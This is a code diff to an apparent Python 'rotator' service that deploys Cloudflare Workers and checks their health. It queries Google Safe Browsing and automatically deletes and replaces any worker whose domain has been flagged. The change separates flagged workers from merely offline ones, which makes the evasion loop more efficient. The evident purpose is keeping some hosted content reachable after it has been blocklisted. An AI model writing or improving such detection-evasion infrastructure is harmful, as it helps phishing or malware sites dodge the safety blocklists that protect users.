@@ -145,13 +145,17 @@ export default {
 """
 
 async def check_worker_health(url):
+    is_up = False
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.head(f"{url}/health", timeout=2) as resp:
-                if resp.status != 200:
-                    return False
+            async with session.head(f"{url}/health", timeout=3) as resp:
+                if resp.status == 200:
+                    is_up = True
     except Exception:
-        return False
+        pass
+
+    if not is_up:
+        return "unhealthy"
 
     if GOOGLE_API_KEY:
         try:
@@ -172,11 +176,12 @@ async def check_worker_health(url):
                         data = await resp.json()
                         if "matches" in data and len(data["matches"]) > 0:
                             log(f"⚠️ [ROTATOR] Google Safe Browsing flagged domain: {domain}")
-                            return False
+                            return "flagged"
         except Exception as e:
             log(f"⚠️ [ROTATOR] Safe Browsing check failed: {str(e)}")
             
-    return True
+    return "healthy"
+
 
 async def fetch_latest_worker_script_from_github():
     # Fetch the latest worker.js from your GitHub repository raw URL
@@ -238,7 +243,7 @@ async def deploy_new_cloudflare_worker():
                             is_safe = False
                             for attempt in range(5):
                                 await asyncio.sleep(5)
-                                if await check_worker_health(worker_url):
+                                if await check_worker_health(worker_url) == "healthy":
                                     is_safe = True
                                     break
                                 log(f"⏳ [CLOUDFLARE API] Retrying health check for {worker_url} (attempt {attempt+1}/5)...")
@@ -269,14 +274,17 @@ async def get_active_worker():
     random.shuffle(workers)
     
     for w in workers:
-        if await check_worker_health(w):
+        h_status = await check_worker_health(w)
+        if h_status == "healthy":
             return w
-        else:
+        elif h_status == "flagged":
             conn = get_db_connection()
             conn.execute("UPDATE workers SET status = 'flagged' WHERE url = ?", (w,))
             conn.commit()
             conn.close()
             log(f"🚨 [ROTATOR] Flagged worker removed from active rotation: {w}")
+        else:
+            log(f"⚠️ [ROTATOR] Worker offline/slow (not flagged): {w}")
             
     new_worker = await deploy_new_cloudflare_worker()
     if new_worker:
@@ -366,10 +374,10 @@ async def workers_health_check_loop():
                 
                 # Check status and health
                 is_flagged_in_db = (status == "flagged")
-                is_safe = await check_worker_health(url) if not is_flagged_in_db else False
+                h_status = await check_worker_health(url) if not is_flagged_in_db else "flagged"
                 
-                if not is_safe:
-                    log(f"⚠️ [HEALTH CHECK] Worker {url} is unhealthy/flagged. Initiating auto-replacement...")
+                if h_status == "flagged":
+                    log(f"⚠️ [HEALTH CHECK] Worker {url} is FLAGGED. Initiating auto-replacement...")
                     
                     # Delete the flagged worker FIRST to avoid duplicate loop checks
                     conn = get_db_connection()
@@ -385,6 +393,21 @@ async def workers_health_check_loop():
                         log(f"✅ [HEALTH CHECK] Successfully deployed replacement worker: {new_worker}")
                     else:
                         log(f"❌ [HEALTH CHECK] Auto-replacement failed to deploy for {url}")
+                elif h_status == "unhealthy":
+                    # Just offline/slow, mark as unhealthy in DB but do NOT delete from Cloudflare
+                    conn = get_db_connection()
+                    conn.execute("UPDATE workers SET status = 'unhealthy' WHERE url = ?", (url,))
+                    conn.commit()
+                    conn.close()
+                    log(f"⚠️ [HEALTH CHECK] Worker {url} is offline/slow, marked unhealthy (not deleted from Cloudflare)")
+                else:
+                    # Healthy, make sure it is marked as healthy in DB
+                    if status != "healthy":
+                        conn = get_db_connection()
+                        conn.execute("UPDATE workers SET status = 'healthy' WHERE url = ?", (url,))
+                        conn.commit()
+                        conn.close()
+
         except Exception as e:
             log(f"❌ [HEALTH CHECK] Loop exception: {str(e)}")
         await asyncio.sleep(300)
